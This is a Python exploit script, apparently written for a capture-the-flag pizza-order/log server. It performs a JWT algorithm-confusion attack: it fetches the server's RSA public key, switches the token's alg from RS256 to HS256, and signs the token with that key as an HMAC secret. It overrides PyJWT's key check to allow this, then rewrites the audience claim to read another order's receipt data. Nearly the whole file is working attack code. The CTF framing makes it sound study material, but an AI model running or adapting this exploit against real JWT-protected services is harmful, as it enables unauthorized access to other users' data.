#!/usr/bin/python

# test script for ctf logserver

# requirement: pyjwt (for this example, not for the exploit itself)
#   -> pip install pyjwt

# exploit:
#
# 1.: - client sends POST /order with some random order data
#     - server saves order, creates JWT signed with his private RSA key and sends back JWT in response
# 2.: - client collects JWT, changes values to indicate other order_id than self
#     - client gets servers public rsa key, changes "alg"-field from RS256 to HS256
#     - client signs JWT with servers pubkey (but now as symmetric key for HS256)
#     - client requests receipt data for other order_id with manipulated JWT
# 3.: - server checks "alg"-field of token before verifying sig
#     - server verifies JWT with alg from "alg" field (now HS256 instead of original RS256)
#       - still verifies with his rsa pubkey (that now is the symmetric secret for HS256) -> sig valid
#     - server responds with requested ressource
# -> client getting ressources he is not supposed to get
#
# Step 1 is optional. One could just directly create a malicious token instead of altering the collected token

import http.client
import jwt
from hashlib import sha256
from random import choice
from string import ascii_letters
from sys import argv, exit

def usage():
    print("{} order_id [ip=127.0.0.1] [port=7777]".format(argv[0]))
    exit(1)

if len(argv) not in (2,3,4):
    usage()

exploit_orderid = argv[1]

if len(argv) > 2:
    addr = argv[2]
else: addr = "localhost"

if len(argv) == 4:
    try:
        port = int(argv[3])
        if not 1 <= port <= 2**16:
            print("invalid port")
            usage()
    except:
        print("invalid port")
        usage()
else: port = 7777

def rand_str(length=5):
    return "".join(choice(ascii_letters) for i in range(length))

# only needed because the lib does not allow key strings like "-----BEGIN PUBLIC KEY..." as HMAC secret
# one could always create the token with some other tool
# returns python bytestring (b'')
def encode_token(payload, pubkey_pem):

    # override prepare_key()
    class customHMACAlgorithm(jwt.algorithms.HMACAlgorithm):

        # would normally raise KeyError if sth like "-----BEGIN PUBLIC KEY-----" in key
        def prepare_key(self, key):
            return jwt.utils.force_bytes(key)

    pyjws_obj = jwt.PyJWT()
    pyjws_obj.unregister_algorithm("HS256")
    pyjws_obj.register_algorithm("HS256", customHMACAlgorithm(sha256))
    
    return pyjws_obj.encode(payload, pubkey_pem, algorithm="HS256")


# first get a JWT by posting an order

print("[*] POST random order to grab JWT from server")
conn = http.client.HTTPConnection(addr, port=port)
body = "name=exploit&address=exploit&pizza_id=1"
headers={
    "Content-Length": len(body),
    "Content-Type": "application/x-www-form-urlencoded"
}
try:
    conn.request("POST", "/order", body=body, headers=headers)
    with conn.getresponse() as res:
        if (res.status == 200):
            jwt_str = res.read()
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)

# get servers public key

print("[*] GET servers public key")
conn = http.client.HTTPConnection(addr, port=port)
try:
    conn.request("GET", "/pubkey")
    with conn.getresponse() as res:
        if res.status == 200:
            pubkey_str_encoded = str(res.read(), "utf8")
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "utf8")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)


####################################
#   actual exploit starting here   #
####################################

# edit token (key will be pubkey in pem format -> "-----BEGIN PUBLIC KEY-----\n...actual key...")

print("[*] create malicious token: ")
header_new = {"alg": "HS256", "typ": "JWT"}
payload_new = jwt.decode(jwt_str, verify=False)
payload_new["aud"] = exploit_orderid # set audience claim to the user we want to get logs from
print(header_new)
print(payload_new)
print("[*] sign with server public key as HMAC secret")
malicious_token = encode_token(payload_new, pubkey_str_encoded) # sign with HS256 and server pubkey as secret

# now try to get ressources with malicious token
print("[*] GET receipt data from order_id "+exploit_orderid+": ")
conn = http.client.HTTPConnection(addr, port=port)
headers = {"Authorization" : "Bearer "+str(malicious_token, "utf8")}
try:
    conn.request("GET", "/receipt?order_id="+exploit_orderid, headers=headers)
    with conn.getresponse() as res:
        if res.status == 200:
            print("[*] recieved receipt data from order_id "+exploit_orderid+":")
            print("-------------------------")
            print(str(res.read(), "utf8"))
            print("-------------------------")
            print("exploit successful")
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)
